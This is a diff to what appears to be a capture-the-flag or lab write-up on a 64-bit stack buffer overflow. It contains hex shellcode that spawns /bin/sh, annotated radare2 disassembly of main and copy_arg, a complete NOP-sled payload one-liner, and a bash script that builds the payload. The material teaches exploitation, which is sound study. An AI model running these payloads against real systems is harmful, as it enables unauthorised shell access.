@@ -1042,11 +1042,8 @@ Earlier, we saw that when a function, in this case main, calls another function,
 
 Know that we know we can control the flow of execution by directing the return address to some memory address, how do we actually do something useful with this. This is where shellcode comes in; shell code quite literally is code that will open up a shell. More specifically, it is binary instructions that can be executed. Since shellcode is just machine code(in the form of binary instructions), you can usually start of by writing a C program to do what you want, compile it into assembly and extract the hex characters(alternatively it would involve writing your own assembly). 
 
-An example shellcode that opens up a basic shell:
+An example 30-byteshellcode that opens up a basic shell:
 `\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05`
-
-There is a simpler option using only 23 bytes:  
-`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`
 
 The basic idea is that we need to point the overwritten return address to the shellcode, but where do we actually store the shellcode and what actual address do we point it at?  
 Why don’t we store the shellcode in the buffer - because we know the address at the beginning of the buffer, we can just overwrite the return address to point to the start of the buffer. 
@@ -1083,37 +1080,18 @@ You’ve probably noticed that shellcode, memory addresses and NOP sleds are usu
 The Expected memory space looks like
 
 ```md
-[140-byte buffer][8-byte RBP][8-byte RIP][8-byt return address]
+[140-byte buffer][8-byte RBP][8-byte RIP][8-byte return address]
 ```
 
 #### Find the Segmentation Error
 
-First, attempt to identify the overflow point:
+We will start at byte 141. This will allow us to see if a compiler has altered the stack layout
 
-```bash
-python -c "print('\x41' * 157)" | ./buffer-overflow
-```
+`:> ./buffer-overflow $(python -c "print('\x41'*141)")` causes the segementation error.  
 
-This commmand fails
+![Early Overflow](/assets/buffer-overflows-task8-01.png)
 
-![Failed Command](assets/buffer-overflow-15-task8-4a.png)  
-
-The reason lies in the difference between STDIN and command line arguements.  
-Conversely, the command entered pipes the string to STDIN, leaving argv[1] as NULL.  
-
-```c
-main(int argc, char **argv)  // ← Accepts command line arguments
-{
-    copy_arg(argv[1]);       // ← Directly passes first command line argument
-}
-
-// This means the program expects:
-$ ./program ARGUMENT_HERE
-//            ↑
-//         This becomes argv[1]
-```
-
-`:> /buffer-overflow $(python -c "print('\x41'*157)")` causes the segementation error.  
+It is likely we are overwriting the Saved Base Pointer (RBP). Disassembly is required to determine what is contained at bytes 141,142, and 143.  
 
 #### Examine the flow
 
@@ -1122,9 +1100,7 @@ radare starts at the entry point instead of main().
 
 Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' main()
 
-![pdf main](assets/buffer-overflow-17a-task8-6a.png)
-
-```asm
+```md
 [0x7ffff7dd9ef0]> s main
 [0x00400564]> pdf
  51: int main (int argc, char **argv, char **envp);
@@ -1142,8 +1118,8 @@ Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' ma
            0x00400578      e8c3feffff     call sym.imp.puts           ; int puts(const char *s) <- puts prints the string to stdout
            0x0040057d      488b45f0       mov rax, qword [var_10h] ; <- go to memory location rbp-0x10, get the value stored there and place that value into rax. The value at this location is the memory address of argv
            0x00400581      4883c008       add rax, 8 ; <- add 8 to value (memory address) at rax, effectivly now pointing to argv[1]. In this program, the user's input
-           0x00400585      488b00         mov rax, qword [rax] ; <- no longer holding a pointer to the memory storing argv[1]. Now holding the memory address of argv[1]
-           0x00400588      4889c7         mov rdi, rax ; <- moves the memory address of argv[1] to rdi. RDI is the 64-bit register that holds the first argument to a function. The next step is the call to a function that will expect a value in RDI. 
+           0x00400585      488b00         mov rax, qword [rax] ; <- Before 0x00400585: rax points to argv[1] (contains address of argv[1]), After 0x00400585: rax contains the value stored at argv[1] , which is a pointer to the actual string
+           0x00400588      4889c7         mov rdi, rax ; <- moves the pointer to the string (argv[1]) to rdi" this passess the address of the string to the function, not copying the entire string contents. RDI is the 64-bit register that holds the first argument to a function. The next step is the call to a function that will expect a value in RDI. 
            0x0040058b      e897ffffff     call sym.copy_arg ; <- call the vulnerable function
            0x00400590      b800000000     mov eax, 0
            0x00400595      c9             leave
@@ -1154,17 +1130,17 @@ Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' ma
 
 #### Call the Vulnerable Function  
 
-```asm
+```md
 [0x00400564]> s sym.copy_arg
 [0x00400527]> pdf
  61: sym.copy_arg (int64_t arg1);
-           ; var int64_t var_98h @ rbp-0x98 <- initiate a 64-bit variable at memory address rbp-0x98 (this is a subtraction expression)
-           ; var int64_t var_90h @ rbp-0x90 <- initiate a 64-bit variable at memory address rbp-0x90, 8-bytes closer to rbp, giving it 152 bytes to accommodate the buffer plus any alignment values. (also a subtraction expression)
+           ; var int64_t var_98h @ rbp-0x98 <- initiate a 64-bit variable at memory address rbp-0x98 (rbp minus 152 bytes) 
+           ; var int64_t var_90h @ rbp-0x90 <- initiate a 64-bit variable at memory address rbp-0x90 (rbp minus 144 bytes).
            ; arg int64_t arg1 @ rdi <- document a function paramter, pointing arg1 to the memory location of rdi
            ; CALL XREF from main @ 0x40058b
            0x00400527      55             push rbp
            0x00400528      4889e5         mov rbp, rsp ; <- creates a static reference point that saves the beginning of the stack
-           0x0040052b      4881eca00000.  sub rsp, 0xa0 ; <- allocate 160 bytes (10*16 + 0 * 16) stack space for this function; subtracts 160 bytes from rsp to move it lower int the stacking, making room for local variables
+           0x0040052b      4881eca00000.  sub rsp, 0xa0 ; <- allocate 160 bytes stack space for this function; subtracts 160 bytes from rsp to move it lower int the stacking, making room for local variables
            0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1 <- rdi is currently storing the memory address of argv[1]. This will move that memory address from rdi as the value contained in var_98h, at memory address rbp-0x98.
            0x00400539      488b9568ffff.  mov rdx, qword [var_98h] ; <-the presence of the brackets moves the value stored at rbp-0x98 to memory location rdx. RDX now contains the pointer to argv[1]
            0x00400540      488d8570ffff.  lea rax, [var_90h] ; <- go to the contents of variable var_90h. Determine the memory address where the value starts, load that address into rax.
@@ -1413,7 +1389,7 @@ After translation from big-endian to little-endian our return address can start 
 
 The attack command, then can become:  
 
-`:> ./buffer-overflow $(python -c "print('\x90'*109 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\xe0\xe2\xff\xff\xff\x7f\x00\x00')")`
+`:> ./buffer-overflow $(python -c "print('\x90'*127 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\xe0\xe2\xff\xff\xff\x7f\x00\x00')")`
 
 ![OOPS](assets/buffer-overflow-19-task8-8.png)
 
@@ -1448,14 +1424,27 @@ fi
 NUM_NOPS=$USER_NUM_NOPS
 echo "Using $NUM_NOPS NOPs"
 
-S_CODE='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+S_CODE="\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"
 NUM_JUNK=12
 # adjust the return address to ensure the return lands within the NOPS
-RET_OVER='\x88\xe2\xff\xff\xff\x7f\'
+RET_OVER="\x10\xe2\xff\xff\xff\x7f\x00\x00"
 
 # The command constructs the full payload using a Python 2 one-liner to generate the string.
 # Note the use of "print" instead of "print()".
 # The resulting string is passed as an argument to the './buffer-overflow' executable.
 # Ensure you have compiled the C code first using "gcc buffer-overflow.c -o buffer-overflow" and disabled security features like ASLR if needed.
-./buffer-overflow $(python -c "print '\x90'*$NUM_NOPS + '$S_CODE' + '\x90'*$NUM_JUNK + '$RET_OVER'")
+payload=$(printf "\x90%.0s" $(seq 1 $NUM_NOPS))
+payload+=$S_CODE
+payload+=$(printf "\x90%.0s" $(seq 1 $NUM_JUNK))
+payload+=$RET_OVER
+
+./buffer-overflow "$payload"
 ```  
+
+NOTE:  
+\x90 : this is the actual NOP instruction byte (the no-operation sled byte).
+%.0s : this is a printf format specifier that means:
+
+- print a string (s),
+- but with a precision of 0 (the .0 part),
+- so it prints zero characters from the argument.  
